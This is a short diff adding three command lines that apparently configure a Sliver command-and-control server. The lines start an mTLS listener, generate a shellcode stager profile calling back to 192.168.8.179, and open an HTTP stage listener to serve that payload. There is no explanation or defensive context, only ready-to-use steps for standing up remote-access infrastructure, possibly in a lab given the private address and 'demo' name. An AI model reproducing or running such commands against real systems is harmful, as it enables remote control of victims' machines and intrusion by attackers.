@@ -1,0 +1,3 @@
+mtls -l 9900
+profiles new --mtls 192.168.8.179:9900 -l -f shellcode stager_demo
+stage-listener -u http://192.168.8.179:9443 -p stager_demo
